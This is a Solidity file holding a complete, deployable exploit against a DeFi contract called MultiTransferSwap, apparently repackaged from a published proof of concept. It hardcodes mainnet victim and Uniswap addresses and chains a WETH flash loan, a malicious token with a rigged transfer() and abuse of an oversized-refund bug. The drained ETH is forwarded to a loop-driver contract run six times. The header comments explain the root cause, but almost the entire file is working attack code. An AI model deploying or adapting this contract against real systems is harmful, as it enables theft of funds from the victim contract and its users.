// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for 2025-04-multitransferswap.
//
// The original Foundry PoC runs the attack loop INLINE in the test contract
// (`ContractTest.testExploit()` deploys 6 `MaliciousSwapToken` helpers and
// calls `.attack()` on each; profit accumulates as native ETH on
// `address(this)`, i.e. the test contract itself). There is no standalone
// "attacker contract" with a single entrypoint in the original test.
//
// This file faithfully copies both contracts (the loop driver + the
// per-iteration flash-loan/helper-token attacker) into a self-contained
// standalone exploit with a single `run()` entrypoint, so it can be deployed
// and driven like a normal exploitContract. Logic and constants are copied
// verbatim from test/multitransferswap_exp.sol; only the harness wrapper
// (BaseTestWithBalanceLog / vm.* cheatcodes) is dropped, and the fixed loop
// count (6 iterations) and profit-forwarding target become explicit.
//
// Root cause: MultiTransferSwap.multiSwapETHForExactTokens refunds unspent
// msg.value using only the FINAL loop iteration's amounts[0], instead of
// accumulating total ETH actually spent across all iterations. A malicious
// token whose transfer() secretly re-credits the pair after each swap makes
// every iteration but the last spend far less than msg.value, so the
// oversized refund based on the last iteration's tiny "amounts[0]" pays out
// almost the entire msg.value back to `to` (the victim contract itself, per
// the call args) while the attacker profits from LP removal + flash-loan
// arithmetic around it.

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Router {
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
}

interface IERC20 {
    function transfer(address to, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IMultiTransferSwap {
    function multiSwapETHForExactTokens(
        uint256 times,
        uint256 amountOut,
        address[] calldata path,
        address to
    ) external payable returns (uint256[] memory amounts);
}

address constant VICTIM = 0x6518905b5917614383E09bF9E94083f8f679aCd1;
address constant WETH_TOKEN = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
address constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
address constant LINK_WETH_PAIR = 0xa2107FA5B38d9bbd2C461D6EDf11B11A50F6b974;

/// @notice Loop driver — deploys 6 MaliciousSwapToken helpers and runs each
/// one's attack() in turn, mirroring `testExploit()`'s `for` loop. All ETH
/// profit forwarded by each helper accumulates here (`address(this)`), exactly
/// as it accumulated on the Foundry test contract in the original PoC.
contract MultiTransferSwapDrain {
    receive() external payable {}

    function run() external {
        for (uint256 i; i < 6; ++i) {
            MaliciousSwapToken token = new MaliciousSwapToken(address(this));
            token.attack();
        }
    }
}

/// @notice Per-iteration attacker: flash-borrows ETH from the LINK/WETH pair,
/// seeds a fresh malicious-token/WETH pair, tricks MultiTransferSwap into an
/// oversized ETH refund via multiSwapETHForExactTokens, removes the seeded
/// liquidity, repays the flash swap, and forwards the ETH profit to
/// `profitReceiver` (the MultiTransferSwapDrain loop driver above).
contract MaliciousSwapToken {
    string public constant name = "Malicious Swap Token";
    string public constant symbol = "MST";
    uint8 public constant decimals = 18;
    uint256 public totalSupply = type(uint128).max;

    mapping(address => uint256) private balances;
    mapping(address => mapping(address => uint256)) public allowance;

    address private immutable profitReceiver;
    address private attackPair;

    receive() external payable {}

    constructor(
        address _profitReceiver
    ) {
        profitReceiver = _profitReceiver;
    }

    function attack() external {
        uint256 victimBalance = VICTIM.balance;
        uint256 flashAmount = victimBalance + 0.01 ether + 139_256;

        IUniswapV2Pair(LINK_WETH_PAIR).swap(0, flashAmount, address(this), bytes("flash"));
    }

    function uniswapV2Call(
        address,
        uint256,
        uint256 amount1,
        bytes calldata
    ) external {
        require(msg.sender == LINK_WETH_PAIR, "unexpected flash pair");

        uint256 amountOut = VICTIM.balance / 2 - 10_000;
        uint256 seedEth = 20_000;
        uint256 tokenSeed = amountOut + seedEth;

        // step 1: seed a fresh WETH/token pair with a tiny amount of WETH and attacker-reported token balance.
        IWETH(payable(WETH_TOKEN)).withdraw(amount1);
        balances[address(this)] = tokenSeed;
        IUniswapV2Router(payable(UNISWAP_V2_ROUTER)).addLiquidityETH{value: seedEth}(
            address(this), tokenSeed, 1, 1, address(this), block.timestamp
        );
        attackPair = IUniswapV2Factory(UNISWAP_V2_FACTORY).getPair(WETH_TOKEN, address(this));

        // step 2: make the victim buy exact helper tokens twice, then receive the oversized refund.
        address[] memory path = new address[](2);
        path[0] = WETH_TOKEN;
        path[1] = address(this);
        IMultiTransferSwap(VICTIM).multiSwapETHForExactTokens{value: address(this).balance}(2, amountOut, path, VICTIM);

        // step 3: remove victim-paid liquidity, repay the flash swap, and forward ETH profit.
        uint256 lpBalance = IUniswapV2Pair(attackPair).balanceOf(address(this));
        IUniswapV2Pair(attackPair).approve(UNISWAP_V2_ROUTER, lpBalance);
        IUniswapV2Router(payable(UNISWAP_V2_ROUTER))
            .removeLiquidity(WETH_TOKEN, address(this), lpBalance, 1, 1, address(this), block.timestamp);

        IWETH(payable(WETH_TOKEN)).deposit{value: address(this).balance}();
        uint256 repayAmount = amount1 + amount1 / 250;
        IERC20(WETH_TOKEN).transfer(LINK_WETH_PAIR, repayAmount);

        uint256 wethProfit = IERC20(WETH_TOKEN).balanceOf(address(this));
        IWETH(payable(WETH_TOKEN)).withdraw(wethProfit);

        (bool ok,) = profitReceiver.call{value: address(this).balance}("");
        require(ok, "profit transfer failed");
    }

    function balanceOf(
        address account
    ) external view returns (uint256) {
        return balances[account];
    }

    function approve(
        address spender,
        uint256 value
    ) external returns (bool) {
        allowance[msg.sender][spender] = value;
        return true;
    }

    function transfer(
        address to,
        uint256 value
    ) external returns (bool) {
        balances[msg.sender] -= value;
        balances[to] += value;

        if (msg.sender == attackPair) {
            balances[attackPair] = 10_000_000_000_000_000_000_000_000_000_000;
        }

        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool) {
        balances[from] -= value;
        balances[to] += value;
        return true;
    }
}
